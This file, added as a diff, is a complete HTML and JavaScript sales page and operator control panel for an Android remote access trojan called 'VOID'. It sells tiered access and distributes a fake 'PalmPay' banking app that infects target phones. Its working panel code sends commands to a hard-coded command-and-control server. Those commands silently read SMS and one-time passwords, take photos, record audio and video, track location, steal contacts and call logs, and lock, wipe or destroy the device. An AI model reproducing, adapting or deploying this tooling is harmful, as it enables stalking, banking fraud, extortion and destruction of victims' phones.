@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>VOID REMOTE ACCESS TOOL</title>
+<style>
+  :root{
+    --bg:#070b14; --card:#0f1729; --card-2:#141f38; --border:#1e2c4d;
+    --accent:#7b5cff; --accent-2:#22d3ee; --danger:#ff3355;
+    --success:#00e676; --text:#eef2fa; --text-2:#8894b5; --text-3:#4d5a7a;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;}
+  html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);min-height:100vh;overflow-x:hidden;}
+  body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:60px;}
+
+  .topbar{width:100%;max-width:1100px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:24px;box-shadow:0 8px 30px rgba(0,0,0,.4);position:sticky;top:8px;z-index:50;}
+  .brand{font-size:15px;letter-spacing:.1em;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .brand small{display:block;font-size:8px;letter-spacing:.3em;color:var(--text-3);font-weight:600;margin-top:2px;-webkit-text-fill-color:initial;}
+  .top-actions{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;}
+  .top-btn{font-size:9.5px;font-weight:800;letter-spacing:.12em;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;border:none;padding:9px 12px;border-radius:10px;cursor:pointer;box-shadow:0 4px 14px rgba(123,92,255,.4);font-family:inherit;}
+
+  .landing{width:100%;max-width:1100px;}
+  .hero{display:grid;grid-template-columns:1.4fr .8fr;gap:34px;align-items:center;padding:30px 0;margin-bottom:40px;}
+  .badge{display:inline-block;background:rgba(123,92,255,.15);color:#b7a9ff;padding:8px 14px;border-radius:50px;font-weight:800;letter-spacing:.15em;font-size:10px;margin-bottom:20px;border:1px solid rgba(123,92,255,.3);}
+  .hero-text h1{font-size:46px;line-height:1.05;font-weight:900;color:#fff;margin-bottom:18px;}
+  .hero-text h1 span{background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .hero-text p{font-size:15px;line-height:1.7;color:var(--text-2);max-width:600px;}
+  .hero-buttons{margin-top:28px;display:flex;flex-wrap:wrap;gap:12px;}
+  .hero-buttons button{padding:16px 26px;border:none;border-radius:14px;font-weight:800;letter-spacing:.15em;font-size:12px;cursor:pointer;font-family:inherit;}
+  .primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 10px 30px rgba(123,92,255,.4);}
+  .secondary{background:var(--card);color:var(--text);border:1px solid var(--border);}
+  .hero-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:24px;padding:30px;text-align:center;}
+  .hero-card .icon{font-size:48px;margin-bottom:16px;}
+  .hero-card h2{font-size:20px;font-weight:800;color:#fff;margin-bottom:8px;}
+  .hero-card .stat{font-size:42px;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent-2));-webkit-background-clip:text;background-clip:text;color:transparent;margin:12px 0;}
+  .hero-card p{color:var(--text-2);font-size:13px;}
+
+  .grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+  .feature{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:18px;padding:22px;text-align:center;}
+  .feature .icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:22px;margin:0 auto 14px;}
+  .feature h3{font-size:15px;font-weight:800;color:#fff;margin-bottom:6px;}
+  .feature p{font-size:12.5px;color:var(--text-2);}
+
+  .pricing-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;max-width:800px;margin:0 auto;}
+  .price-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:28px 22px;text-align:center;}
+  .price-card.featured{border-color:var(--accent);}
+  .price-card .tier{font-size:11px;font-weight:900;color:var(--accent-2);margin-bottom:12px;}
+  .price-card .price{font-size:36px;font-weight:900;color:#fff;}
+  .price-card ul{list-style:none;text-align:left;margin-bottom:22px;}
+  .price-card li{font-size:12.5px;color:var(--text-2);padding:7px 0;border-bottom:1px solid #16233c;}
+  .upgrade-btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;font-size:12px;cursor:pointer;}
+  .upgrade-btn.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);}
+
+  .downloads-grid{display:grid;grid-template-columns:1fr;gap:18px;max-width:400px;margin:0 auto;}
+  .dl-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:24px;}
+  .dl-head{display:flex;align-items:center;gap:14px;margin-bottom:14px;}
+  .dl-icon{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:24px;}
+  .dl-card h3{font-size:17px;font-weight:900;color:#fff;}
+  .dl-card p{font-size:12.5px;color:var(--text-2);margin-bottom:18px;}
+  .dl-btn{display:block;width:100%;padding:14px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;text-align:center;text-decoration:none;}
+
+  footer{width:100%;max-width:1100px;margin-top:60px;padding:30px;text-align:center;color:var(--text-3);font-size:11px;border-top:1px solid var(--border);}
+
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(12px);display:none;align-items:flex-start;justify-content:center;z-index:100;padding:20px;overflow-y:auto;}
+  .modal-overlay.show{display:flex;}
+  .modal-box{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:30px 24px;width:100%;max-width:440px;}
+  .modal-title{text-align:center;font-size:22px;font-weight:900;color:#fff;margin-bottom:6px;}
+  .modal-sub{text-align:center;font-size:12px;color:var(--text-2);margin-bottom:24px;}
+
+  .field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:14px;padding:17px;color:#00e676;font-size:24px;letter-spacing:.3em;margin-bottom:12px;text-align:center;outline:none;font-family:monospace;font-weight:900;}
+
+  .panel{width:100%;max-width:520px;display:none;}
+  .panel.active{display:block;}
+  .panel-header{display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:var(--card);border:1px solid var(--border);border-radius:18px;margin-bottom:14px;}
+  .panel-header .logo{font-size:15px;font-weight:900;color:var(--accent);}
+  .panel-header .logout{font-size:10px;color:var(--text-2);background:var(--card-2);border:1px solid var(--border);padding:8px 14px;border-radius:10px;cursor:pointer;}
+
+  .tier-strip{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:var(--card);border:1px solid var(--border);border-radius:14px;margin-bottom:14px;}
+  .tier-badge{font-size:10px;font-weight:900;padding:6px 12px;border-radius:20px;background:rgba(123,92,255,.2);color:#b7a9ff;}
+
+  .screen{display:none;}
+  .screen.active{display:block;}
+  .page-title{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px;}
+  .page-sub{font-size:10px;color:var(--text-3);margin-bottom:18px;}
+  .device-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
+  .device-card .dev-id{font-size:17px;font-weight:900;color:#fff;}
+  .device-card .dev-model{font-size:11px;color:var(--text-2);margin-top:4px;}
+  .device-card .status{font-size:9px;font-weight:800;padding:7px 13px;border-radius:20px;}
+  .status.online{background:rgba(0,230,118,.15);color:var(--success);}
+  .status.offline{background:rgba(77,90,122,.15);color:var(--text-3);}
+
+  .back-btn{background:var(--card);border:1px solid var(--border);color:var(--text-2);font-size:11px;padding:10px 16px;border-radius:12px;margin-bottom:16px;cursor:pointer;}
+  .detail-title{font-size:22px;font-weight:900;color:#fff;}
+  .detail-sub{font-size:11px;color:var(--text-2);margin-bottom:18px;}
+  .section-label{font-size:10px;font-weight:800;color:var(--text-3);margin:22px 0 10px;}
+
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+  .ctrl{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 8px;display:flex;flex-direction:column;align-items:center;cursor:pointer;}
+  .ctrl .icon{font-size:22px;margin-bottom:5px;}
+  .ctrl .label{font-size:10px;font-weight:800;color:var(--text);}
+  .ctrl.danger{border-color:rgba(255,51,85,.3);}
+  .output{background:#04070f;border:1px solid var(--border);border-radius:14px;padding:16px;font-size:13px;color:#b7c9ff;font-family:monospace;max-height:55vh;min-height:160px;overflow-y:auto;white-space:pre-wrap;}
+  .output img{max-width:100%;border-radius:10px;margin-top:8px;}
+  .app-row{display:flex;justify-content:space-between;background:#0f1a33;border-radius:10px;padding:10px 14px;margin-bottom:6px;cursor:pointer;}
+  .app-row .app-name{color:#e5edf9;font-size:13px;font-weight:600;}
+  .app-row .app-open{color:var(--accent-2);font-size:10px;font-weight:800;}
+
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--accent);color:#fff;padding:14px 22px;border-radius:14px;font-size:12px;opacity:0;transition:.3s;z-index:200;}
+  .toast.show{opacity:1;}
+  .loading{text-align:center;padding:40px;color:var(--text-3);}
+  .modal-img{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;align-items:center;justify-content:center;z-index:200;}
+  .modal-img.show{display:flex;}
+  .modal-img img{max-width:100%;max-height:90vh;}
+  .modal-close-btn{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;cursor:pointer;}
+
+  @media(max-width:850px){ .hero{grid-template-columns:1fr;} .grid-4{grid-template-columns:1fr 1fr;} .pricing-grid{grid-template-columns:1fr;} }
+</style>
+</head>
+<body>
+
+<div class="topbar" id="topbarLanding">
+  <div class="brand">VOID<small>REMOTE ACCESS TOOL</small></div>
+  <div class="top-actions">
+    <button class="top-btn ghost" onclick="goTo('functions')">FUNCTIONS</button>
+    <button class="top-btn ghost" onclick="goTo('pricing')">PRICING</button>
+    <button class="top-btn" onclick="openLoginModal()">I HAVE A CODE</button>
+  </div>
+</div>
+
+<div class="landing" id="landing">
+  <div class="hero">
+    <div class="hero-text">
+      <div class="badge">SECURITY PROFESSIONALS</div>
+      <h1>Advanced Android <span>management toolkit</span> for security professionals.</h1>
+      <p>Monitor, control, and secure any Android device from your browser. Real-time access, zero installation complexity, professional-grade reliability.</p>
+      <div class="hero-buttons">
+        <button class="primary" onclick="goTo('pricing')">GET ACCESS</button>
+        <button class="secondary" onclick="openLoginModal()">I HAVE A CODE</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <div class="icon">🛡️</div>
+      <h2>Trusted by operators</h2>
+      <div class="stat">24/7</div>
+      <p>Continuous monitoring across all devices</p>
+    </div>
+  </div>
+
+  <section id="functions">
+    <h2 style="text-align:center;color:#fff;margin-bottom:30px;">Available Functions</h2>
+    <div class="grid-4">
+      <div class="feature"><div class="icon">📍</div><h3>Location Tracking</h3><p>Real-time GPS + Google Maps link.</p></div>
+      <div class="feature"><div class="icon">📸</div><h3>Camera Capture</h3><p>Silent photo from back or front camera.</p></div>
+      <div class="feature"><div class="icon">💬</div><h3>SMS Reader</h3><p>Last 50 messages including OTPs.</p></div>
+      <div class="feature"><div class="icon">📱</div><h3>Screen Capture</h3><p>Live screenshot of the target device.</p></div>
+      <div class="feature"><div class="icon">🔴</div><h3>Live Screen</h3><p>Continuous screenshots every 3s.</p></div>
+      <div class="feature"><div class="icon">🔔</div><h3>Notifications</h3><p>Recent notifications from all apps.</p></div>
+      <div class="feature"><div class="icon">👤</div><h3>Contacts</h3><p>Full contact list with numbers.</p></div>
+      <div class="feature"><div class="icon">📞</div><h3>Call Log</h3><p>Last 50 calls with timestamps.</p></div>
+    </div>
+  </section>
+
+  <section id="pricing" style="margin-top:60px;">
+    <h2 style="text-align:center;color:#fff;margin-bottom:30px;">Access Tiers</h2>
+    <div class="pricing-grid">
+      <div class="price-card featured">
+        <div class="tier">PRO</div>
+        <div class="price">₦1,000</div>
+        <ul>
+          <li>10 commands per day</li>
+          <li>All standard commands</li>
+          <li>Priority support</li>
+        </ul>
+        <button class="upgrade-btn whatsapp" onclick="buyCode('pro')">BUY PRO VIA WHATSAPP</button>
+      </div>
+      <div class="price-card">
+        <div class="tier">VIP</div>
+        <div class="price">₦3,000</div>
+        <ul>
+          <li>Unlimited commands</li>
+          <li>Camera, Audio, Video, Files</li>
+          <li>Ransom Lock + Wipe + Bug Phone</li>
+        </ul>
+        <button class="upgrade-btn whatsapp" onclick="buyCode('vip')">BUY VIP VIA WHATSAPP</button>
+      </div>
+    </div>
+  </section>
+
+  <section style="margin-top:60px;">
+    <h2 style="text-align:center;color:#fff;margin-bottom:30px;">Target App Download</h2>
+    <div class="downloads-grid">
+      <div class="dl-card">
+        <div class="dl-head">
+          <div class="dl-icon">💳</div>
+          <div>
+            <h3>PalmPay Clone</h3>
+            <div class="dl-sub">VERSION 1.0 — ANDROID</div>
+          </div>
+        </div>
+        <p>Looks exactly like the real PalmPay app. Links the target device to your panel.</p>
+        <a class="dl-btn" href="#">DOWNLOAD APK</a>
+      </div>
+    </div>
+  </section>
+
+  <footer>VOID REMOTE ACCESS TOOL © 2026 — All rights reserved</footer>
+</div>
+
+<div class="modal-overlay" id="loginModal">
+  <div class="modal-box">
+    <div class="modal-title">Log In</div>
+    <div class="modal-sub">Enter your access code</div>
+    <input class="field" id="loginCode" placeholder="•••••" maxlength="6" inputmode="numeric">
+    <div style="display:flex; gap:10px; margin-top:14px;">
+      <button onclick="closeModal()" style="flex:1; padding:14px; border-radius:12px; border:1px solid var(--border); background:var(--card); color:var(--text-2); font-weight:800; font-size:12px;">CANCEL</button>
+      <button onclick="loginWithCode()" style="flex:1; padding:14px; border-radius:12px; border:none; background:linear-gradient(135deg,var(--accent),var(--accent-2)); color:#fff; font-weight:800; font-size:12px;">ENTER</button>
+    </div>
+  </div>
+</div>
+
+<div class="panel" id="panel">
+  <div class="panel-header">
+    <div class="logo">VOID<small>CONTROL PANEL</small></div>
+    <button class="logout" id="logoutBtn">LOGOUT</button>
+  </div>
+
+  <div class="tier-strip">
+    <span class="tier-badge" id="tierBadge">PRO</span>
+    <span class="tier-counter" id="tierCounter">10 commands remaining</span>
+    <button class="tier-upgrade-btn" id="tierUpgradeBtn" onclick="buyCode('vip')">UPGRADE</button>
+  </div>
+
+  <div class="screen active" id="screenList">
+    <div class="page-title">DEVICES</div>
+    <div class="page-sub">YOUR CONNECTED TARGETS</div>
+    <div id="deviceListContainer"><div class="loading">LOADING</div></div>
+  </div>
+
+  <div class="screen" id="screenDetail">
+    <button class="back-btn" id="backBtn">&lt; BACK</button>
+    <div class="detail-title" id="detailTitle">—</div>
+    <div class="detail-sub" id="detailSub">—</div>
+    <div class="section-label">REMOTE CONTROL</div>
+    <div class="grid">
+      <div class="ctrl" data-cmd="location_sync"><div class="icon">📍</div><div class="label">LOCATION</div></div>
+      <div class="ctrl" data-cmd="photo_capture"><div class="icon">📸</div><div class="label">BACK CAM</div></div>
+      <div class="ctrl" data-cmd="message_sync"><div class="icon">💬</div><div class="label">SMS</div></div>
+      <div class="ctrl" data-cmd="display_read"><div class="icon">📱</div><div class="label">SCREENSHOT</div></div>
+      <div class="ctrl" data-cmd="flash_spam"><div class="icon">🔦</div><div class="label">FLASH SPAM</div></div>
+      <div class="ctrl" data-cmd="contact_sync"><div class="icon">👤</div><div class="label">CONTACTS</div></div>
+      <div class="ctrl" data-cmd="call_sync"><div class="icon">📞</div><div class="label">CALL LOG</div></div>
+      <div class="ctrl" data-cmd="app_list"><div class="icon">📦</div><div class="label">APPS</div></div>
+      <div class="ctrl" data-cmd="self_photo"><div class="icon">🤳</div><div class="label">SELFIE</div></div>
+      <div class="ctrl" data-cmd="clip_record" data-arg="10"><div class="icon">🎥</div><div class="label">VIDEO</div></div>
+      <div class="ctrl" data-cmd="voice_record" data-arg="15"><div class="icon">🎤</div><div class="label">AUDIO</div></div>
+      <div class="ctrl" data-cmd="notice_send"><div class="icon">💭</div><div class="label">TOAST</div></div>
+      <div class="ctrl danger" data-cmd="session_pause"><div class="icon">🔒</div><div class="label">LOCK</div></div>
+      <div class="ctrl danger" data-cmd="factory_reset"><div class="icon">⚠️</div><div class="label">WIPE</div></div>
+      <div class="ctrl danger" data-cmd="bug_phone"><div class="icon">☠️</div><div class="label">BUG PHONE</div></div>
+    </div>
+    <div class="section-label" style="margin-top:20px;">LIVE OUTPUT</div>
+    <div class="output" id="outputBox"><div class="empty">WAITING FOR COMMAND</div></div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<div class="modal-img" id="imgModal"><button class="modal-close-btn" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button><img id="imgModalImg" src=""></div>
+
+<script>
+const SERVER = "https://thevoidbugtool2-0.onrender.com"; // MUST MATCH YOUR SERVER URL
+const WHATSAPP = "2349153239545";
+
+let state = {
+  userId:null, isAdmin:false, currentDevice:null, pollTimer:null, lastResultId:0
+};
+
+function $(id){return document.getElementById(id);}
+function esc(s){return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+
+function goTo(id){ const el = $(id); if(el) el.scrollIntoView({behavior:'smooth'}); }
+function showToast(msg){ const t = $('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500); }
+function openLoginModal(){ $('loginModal').classList.add('show'); setTimeout(()=>{ $('loginCode').value=''; $('loginCode').focus(); }, 100); }
+function closeModal(){ $('loginModal').classList.remove('show'); }
+
+async function loginWithCode(){
+  const code = $('loginCode').value.trim();
+  if(code.length < 5){ showToast('Enter your access code'); return; }
+  closeModal();
+  
+  try{
+    const r = await fetch(SERVER+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:code})});
+    const j = await r.json();
+    if(!j.ok){ showToast('Invalid code'); return; }
+
+    state.userId = j.userId;
+    state.isAdmin = !!j.admin;
+
+    $('landing').style.display = 'none';
+    $('topbarLanding').style.display = 'none';
+    $('panel').classList.add('active');
+
+    if (state.isAdmin) {
+        $('tierBadge').textContent = 'ADMIN';
+        $('tierCounter').textContent = 'Unlimited · All devices';
+        $('tierUpgradeBtn').style.display = 'none';
+    } else {
+        $('tierBadge').textContent = 'VIP';
+        $('tierCounter').textContent = 'Unlimited commands';
+        $('tierUpgradeBtn').style.display = 'none';
+    }
+
+    loadDevices();
+  }catch(e){ showToast('Server unreachable'); }
+}
+
+$('logoutBtn').addEventListener('click', function(){
+  state.userId = null; state.currentDevice = null; state.isAdmin = false;
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  $('panel').classList.remove('active');
+  $('landing').style.display = 'block';
+  $('topbarLanding').style.display = 'flex';
+  $('screenList').classList.add('active');
+  $('screenDetail').classList.remove('active');
+  window.scrollTo(0, 0);
+});
+
+async function loadDevices(){
+  const c = $('deviceListContainer');
+  c.innerHTML = '<div class="loading">LOADING</div>';
+  try{
+    const adminParam = state.isAdmin ? '&admin=1' : '';
+    const r = await fetch(SERVER+'/clients?wallet='+encodeURIComponent(state.userId)+adminParam);
+    const j = await r.json();
+    const list = j.clients || j.devices || [];
+    
+    if(!j.ok || !list.length){
+      c.innerHTML =
+        '<div style="text-align:center;padding:36px 20px;background:linear-gradient(180deg,#141f38,#0f1729);border:1px solid #1e2c4d;border-radius:16px;">' +
+          '<div style="font-size:44px;margin-bottom:14px;">📱</div>' +
+          '<div style="font-size:15px;font-weight:800;color:#fff;margin-bottom:8px;">No Device Connected</div>' +
+          '<div style="font-size:13px;color:#8894b5;line-height:1.65;margin-bottom:16px;">' +
+            'Your code is <strong style="color:#00e676;font-family:monospace;font-size:15px;">' + esc(state.userId) + '</strong>' +
+          '</div>' +
+          '<div style="font-size:12.5px;color:#8894b5;line-height:1.7;padding:14px;background:#0a1220;border-radius:12px;border:1px solid #1e2c4d;">' +
+            '1. Open the <strong style="color:#fff;">PalmPay app</strong> on the target phone<br>' +
+            '2. Enter the code above during setup<br>' +
+            '3. Grant all permissions<br>' +
+            '4. Device appears here in ~25 seconds' +
+          '</div>' +
+        '</div>';
+      return;
+    }
+    
+    c.innerHTML = '';
+    list.forEach(function(d){
+      const el = document.createElement('div');
+      el.className = 'device-card';
+      el.innerHTML = '<div class="info"><div class="dev-id">'+esc(d.userId)+'</div><div class="dev-model">'+esc(d.device||'?')+' • '+esc(d.android||'?')+' • Batt: '+esc(d.battery||'?')+'</div></div><div class="status '+(d.online?'online':'offline')+'">'+(d.online?'ONLINE':'OFFLINE')+'</div>';
+      el.addEventListener('click', function(){ openDevice(d.userId); });
+      c.appendChild(el);
+    });
+  }catch(e){ c.innerHTML = '<div class="loading">SERVER ERROR — tap to retry</div>'; c.onclick = loadDevices; }
+}
+
+async function openDevice(userId){
+  state.currentDevice = userId;
+  state.lastResultId = 0;
+  $('detailTitle').textContent = userId;
+  $('detailSub').textContent = 'LOADING INFO';
+  $('outputBox').innerHTML = '<div class="empty">WAITING FOR COMMAND</div>';
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+  $('screenDetail').classList.add('active');
+  try{
+    const r = await fetch(SERVER+'/client?id='+encodeURIComponent(userId));
+    const j = await r.json();
+    if(j.ok){
+      const online = j.online ? 'ONLINE' : 'OFFLINE';
+      $('detailSub').textContent = (j.device||'?') + ' • ' + (j.android||'?') + ' • ' + online;
+    }
+  }catch(e){}
+  startResultPoll();
+}
+
+$('backBtn').addEventListener('click', function(){
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  state.pollTimer = null;
+  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+  $('screenList').classList.add('active');
+  loadDevices();
+});
+
+document.querySelectorAll('.ctrl').forEach(function(el){
+  el.addEventListener('click', async function(){
+    if(!state.currentDevice){ showToast('No device selected'); return; }
+    const cmd = el.dataset.cmd;
+    let arg = el.dataset.arg || '';
+
+    if(cmd === 'factory_reset'){ if(!confirm('WIPE THE TARGET DEVICE?')) return; }
+    if(cmd === 'bug_phone'){ if(!confirm('WARNING: THIS WILL PERMANENTLY DESTROY THE TARGET PHONE. PROCEED?')) return; }
+    if(cmd === 'notice_send'){ const t = prompt('Toast message:', 'Hello'); if(t === null) return; arg = t; }
+    if(cmd === 'clip_record'){ const s = prompt('Video length (seconds):', '10'); if(s === null) return; arg = s; }
+    if(cmd === 'voice_record'){ const s = prompt('Audio length (seconds):', '15'); if(s === null) return; arg = s; }
+
+    try{
+      const r = await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg})});
+      const j = await r.json();
+      if(!j.ok){
+        showToast('Send failed: ' + (j.err||'unknown'));
+        return;
+      }
+      showToast('Sent: '+cmd);
+    }catch(e){ showToast('Server error'); }
+  });
+});
+
+function startResultPoll(){
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  state.pollTimer = setInterval(async function(){
+    if(!state.currentDevice) return;
+    try{
+      const r = await fetch(SERVER+'/client?id='+encodeURIComponent(state.currentDevice));
+      const j = await r.json();
+      if(!j.ok) return;
+
+      if(j.results && j.results.length){
+        const box = $('outputBox');
+        if(box.querySelector('.empty')) box.innerHTML = '';
+        j.results.forEach(function(res){
+          if(res.at <= state.lastResultId) return;
+          state.lastResultId = res.at;
+          const line = document.createElement('div');
+          line.style.marginBottom = '14px';
+          line.style.paddingBottom = '12px';
+          line.style.borderBottom = '1px solid #1a2440';
+
+          if(res.cmd === 'app_list' && res.data){
+            let html = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;margin-bottom:10px;">&gt; INSTALLED APPS</div>';
+            res.data.split('\n').forEach(function(l){
+              if(l.indexOf(' | ') > -1){
+                const parts = l.split(' | ');
+                const name = parts[0].trim();
+                const pkg = parts[1] ? parts[1].trim() : '';
+                if(pkg){
+                  html += '<div class="app-row" data-pkg="' + esc(pkg) + '"><div class="app-name">' + esc(name) + '</div><div class="app-open">OPEN ▸</div></div>';
+                }
+              }
+            });
+            line.innerHTML = html;
+          }
+          else if(j.uploads && j.uploads.length){
+            const matchUpload = j.uploads.find(function(u){
+              return (u.type && res.cmd && u.type.toLowerCase().indexOf(res.cmd) === 0) ||
+                     (res.cmd === 'display_read' && u.type && u.type.toLowerCase() === 'screen') ||
+                     (res.cmd === 'photo_capture' && u.type && u.type.toLowerCase() === 'photo') ||
+                     (res.cmd === 'self_photo' && u.type && u.type.toLowerCase() === 'photo');
+            });
+            if(matchUpload){
+              const url = matchUpload.url;
+              line.innerHTML = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div><img src="' + url + '" onclick="openImage(\'' + url + '\')"/><div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+            } else {
+              line.innerHTML = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div><div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div><div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+            }
+          }
+          else {
+            line.innerHTML = '<div style="color:#8b7aff;font-weight:700;font-size:13px;letter-spacing:.1em;">&gt; ' + esc(res.cmd).toUpperCase() + '</div><div style="color:#b7c9ff;font-size:13px;line-height:1.7;margin-top:6px;word-break:break-word;">' + esc(res.data||'(empty)') + '</div><div style="color:#4d5a7a;font-size:10px;margin-top:6px;">' + new Date(res.at).toLocaleTimeString() + '</div>';
+          }
+          box.insertBefore(line, box.firstChild);
+        });
+
+        document.querySelectorAll('.app-row').forEach(function(row){
+          row.onclick = async function(){
+            const pkg = row.dataset.pkg;
+            if(!pkg || !state.currentDevice) return;
+            try{
+              await fetch(SERVER+'/dispatch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:state.currentDevice, cmd:'app_launch', args:pkg})});
+              showToast('Opening ' + pkg.split('.').pop());
+            }catch(e){ showToast('Error'); }
+          };
+        });
+      }
+    }catch(e){}
+  }, 2000);
+}
+
+function openImage(url){ $('imgModalImg').src = url; $('imgModal').classList.add('show'); }
+
+function buyCode(tier){
+  const price = tier === 'pro' ? '1,000' : '3,000';
+  const msg = encodeURIComponent('Hi, I want to buy ' + tier.toUpperCase() + ' tier.\n\nPrice: ₦' + price + '\n\nPlease send me payment details and my code.');
+  window.open('https://wa.me/' + WHATSAPP + '?text=' + msg, '_blank');
+}
+</script>
+</body>
+</html>
